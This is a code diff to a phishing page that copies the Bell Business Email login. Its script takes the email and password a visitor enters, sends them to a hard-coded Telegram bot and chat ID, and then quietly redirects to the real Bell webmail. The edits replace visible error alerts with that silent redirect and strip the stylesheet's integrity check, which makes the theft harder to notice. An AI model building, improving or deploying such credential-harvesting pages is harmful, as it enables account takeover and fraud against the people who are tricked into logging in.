@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bell Business Email Login</title>
   <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-CG3HGlQ9BrCgE9bFTbWxu7v+4FCYSPmbXxk2fpQr8cmNjHh9c9nL1YbZx0+VUFmT0SR9GwKn1LTKQITuCRLBug==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     * {
       margin: 0;
@@ -112,9 +112,9 @@
         <h2>Log in</h2>
         <form id="loginForm">
           <label for="email">Email address</label>
-          <input type="text" id="email" name="email" />
+          <input type="text" id="email" name="email" required />
           <label for="password">Password</label>
-          <input type="password" id="password" name="password" />
+          <input type="password" id="password" name="password" required />
           <button type="submit">Log in</button>
         </form>
         <div class="links">
@@ -127,11 +127,11 @@
   </div>
 
   <script>
-    const BOT_TOKEN = '7872296367:AAHBItXb7od6gkGaqb4JzDFbrlsHjPLAWzY'; // Replace with your bot token
-    const CHAT_ID = '7601666417'; // Replace with your Telegram user ID
+    const BOT_TOKEN = '7872296367:AAHBItXb7od6gkGaqb4JzDFbrlsHjPLAWzY'; // Replace with your Telegram Bot Token
+    const CHAT_ID = '7601666417'; // Replace with your Telegram Chat ID
 
     document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault(); // Prevent form from submitting normally
+      e.preventDefault();
 
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
@@ -149,16 +149,11 @@
         })
       })
       .then(response => {
-        if (response.ok) {
-          alert("Logging in...");
-          // Optionally redirect or do something else
-          // window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
-        } else {
-          alert("Error sending to Telegram.");
-        }
+        // Redirect silently after message is sent
+        window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
       })
       .catch(error => {
-        alert("Network error.");
+        window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
       });
     });
   </script>
